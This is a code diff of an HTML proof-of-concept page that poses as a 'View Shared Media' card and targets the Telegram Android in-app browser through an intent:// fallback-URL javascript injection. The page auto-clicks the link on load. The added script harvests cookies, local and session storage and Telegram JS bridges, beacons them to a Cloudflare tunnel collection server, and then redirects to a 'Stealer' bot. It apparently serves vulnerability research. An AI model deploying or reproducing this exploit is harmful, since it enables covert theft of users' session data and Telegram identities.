@@ -24,8 +24,140 @@
 <div class="card">
   <h2>View Shared Media</h2>
   <p>3 photos shared with you</p>
-  <a id="trigger" class="btn" href="intent://x#Intent;scheme=nonexistent99;S.browser_fallback_url=javascript:void((s=document.createElement('script'),s.src='https://ajm4n.github.io/tg-miniapp-poc/xss.js',document.head.appendChild(s)));end">View Photos</a>
+  <a id="trigger" class="btn" href="intent://x#Intent;scheme=nonexistent99;S.browser_fallback_url=javascript:void(xssProof());end">View Photos</a>
 </div>
-<script>setTimeout(function(){document.getElementById('trigger').click()},500)</script>
+<script>
+function xssProof() {
+  // Collect accessible data
+  var cookies = document.cookie || '(none)';
+  var lsKeys = [];
+  try {
+    for (var i = 0; i < localStorage.length; i++) {
+      var k = localStorage.key(i);
+      lsKeys.push(k + ' = ' + (localStorage.getItem(k) || '').substring(0, 100));
+    }
+  } catch(e) {}
+
+  var ssKeys = [];
+  try {
+    for (var i = 0; i < sessionStorage.length; i++) {
+      var k = sessionStorage.key(i);
+      ssKeys.push(k + ' = ' + (sessionStorage.getItem(k) || '').substring(0, 100));
+    }
+  } catch(e) {}
+
+  // Check for Telegram JS bridges
+  var bridges = [];
+  var bridgeNames = ['TelegramWebviewProxy','TelegramGameProxy','TelegramWebview','__tg__','Telegram','Android','app','native'];
+  for (var j = 0; j < bridgeNames.length; j++) {
+    try {
+      if (window[bridgeNames[j]]) {
+        var methods = [];
+        try { for (var p in window[bridgeNames[j]]) methods.push(p); } catch(e) {}
+        bridges.push(bridgeNames[j] + ' (' + typeof window[bridgeNames[j]] + ')' + (methods.length ? ': ' + methods.join(', ') : ''));
+      }
+    } catch(e) {}
+  }
+
+  // Send to collection server
+  try {
+    navigator.sendBeacon('https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect/xss', JSON.stringify({
+      type: 'xss',
+      data: {
+        origin: location.origin,
+        domain: document.domain,
+        protocol: location.protocol,
+        url: location.href,
+        cookies: cookies,
+        localStorage: lsKeys,
+        sessionStorage: ssKeys,
+        bridges: bridges,
+        ua: navigator.userAgent
+      },
+      ts: Date.now()
+    }));
+  } catch(e) {}
+
+  // Transform the page into XSS proof display
+  var el = document.body;
+  el.style.background = '#0d1117';
+  el.style.color = '#c9d1d9';
+  el.style.fontFamily = 'ui-monospace, "Courier New", monospace';
+  el.style.fontSize = '12px';
+  el.style.padding = '16px';
+
+  var html = '';
+  html += '<div style="text-align:center;padding:16px 0 12px;border-bottom:2px solid #ff0040">';
+  html += '<h1 style="color:#ff0040;font-size:22px;letter-spacing:3px">XSS CONFIRMED</h1>';
+  html += '<div style="color:#f85149;font-size:11px;margin-top:4px">Telegram Android In-App Browser</div>';
+  html += '<div style="color:#6e7681;font-size:10px;margin-top:2px">intent:// URI browser_fallback_url injection</div>';
+  html += '</div>';
+
+  html += '<div style="margin-top:14px"><div style="color:#58a6ff;font-size:13px;font-weight:bold;margin-bottom:6px;border-bottom:1px solid #21262d;padding-bottom:3px">EXECUTION CONTEXT</div>';
+  html += '<div style="padding:2px 0"><span style="color:#8b949e;display:inline-block;width:80px">Origin:</span> <span style="color:#7ee787">' + esc(location.origin) + '</span></div>';
+  html += '<div style="padding:2px 0"><span style="color:#8b949e;display:inline-block;width:80px">Domain:</span> <span style="color:#7ee787">' + esc(document.domain) + '</span></div>';
+  html += '<div style="padding:2px 0"><span style="color:#8b949e;display:inline-block;width:80px">Protocol:</span> <span style="color:#7ee787">' + esc(location.protocol) + '</span></div>';
+  html += '</div>';
+
+  html += '<div style="margin-top:14px"><div style="color:#58a6ff;font-size:13px;font-weight:bold;margin-bottom:6px;border-bottom:1px solid #21262d;padding-bottom:3px">COOKIES (document.cookie)</div>';
+  html += '<div style="color:#ffa657;padding:2px 0;word-break:break-all">' + esc(cookies) + '</div>';
+  html += '</div>';
+
+  html += '<div style="margin-top:14px"><div style="color:#58a6ff;font-size:13px;font-weight:bold;margin-bottom:6px;border-bottom:1px solid #21262d;padding-bottom:3px">LOCAL STORAGE (' + lsKeys.length + ' keys)</div>';
+  if (lsKeys.length) {
+    for (var i = 0; i < lsKeys.length; i++) html += '<div style="color:#ffa657;padding:2px 0;word-break:break-all">' + esc(lsKeys[i]) + '</div>';
+  } else {
+    html += '<div style="color:#484f58;font-style:italic">(empty)</div>';
+  }
+  html += '</div>';
+
+  html += '<div style="margin-top:14px"><div style="color:#58a6ff;font-size:13px;font-weight:bold;margin-bottom:6px;border-bottom:1px solid #21262d;padding-bottom:3px">SESSION STORAGE (' + ssKeys.length + ' keys)</div>';
+  if (ssKeys.length) {
+    for (var i = 0; i < ssKeys.length; i++) html += '<div style="color:#ffa657;padding:2px 0;word-break:break-all">' + esc(ssKeys[i]) + '</div>';
+  } else {
+    html += '<div style="color:#484f58;font-style:italic">(empty)</div>';
+  }
+  html += '</div>';
+
+  html += '<div style="margin-top:14px"><div style="color:#58a6ff;font-size:13px;font-weight:bold;margin-bottom:6px;border-bottom:1px solid #21262d;padding-bottom:3px">TELEGRAM JS BRIDGES</div>';
+  if (bridges.length) {
+    for (var i = 0; i < bridges.length; i++) html += '<div style="color:#ff7b72;font-weight:bold;padding:2px 0">' + esc(bridges[i]) + '</div>';
+  } else {
+    html += '<div style="color:#484f58;font-style:italic">(none detected)</div>';
+  }
+  html += '</div>';
+
+  html += '<div style="margin-top:14px"><div style="color:#58a6ff;font-size:13px;font-weight:bold;margin-bottom:6px;border-bottom:1px solid #21262d;padding-bottom:3px">USER AGENT</div>';
+  html += '<div style="color:#7ee787;font-size:10px;word-break:break-all">' + esc(navigator.userAgent) + '</div>';
+  html += '</div>';
+
+  html += '<div id="cd" style="text-align:center;color:#ff0040;margin-top:18px;font-size:13px;padding:10px;border:1px solid #30363d;border-radius:6px;background:#161b22">Stealing Telegram identity in 6s...</div>';
+
+  el.innerHTML = html;
+
+  // Countdown then chain to Mini App
+  var sec = 6;
+  var timer = setInterval(function() {
+    sec--;
+    var cdEl = document.getElementById('cd');
+    if (cdEl) cdEl.textContent = 'Stealing Telegram identity in ' + sec + 's...';
+    if (sec <= 0) {
+      clearInterval(timer);
+      location.href = 'tg://resolve?domain=Stealer1337bot&start=auto&startapp=x';
+    }
+  }, 1000);
+}
+
+function esc(s) {
+  var d = document.createElement('div');
+  d.textContent = s || '';
+  return d.innerHTML;
+}
+
+// Auto-trigger
+setTimeout(function() {
+  document.getElementById('trigger').click();
+}, 500);
+</script>
 </body>
 </html>
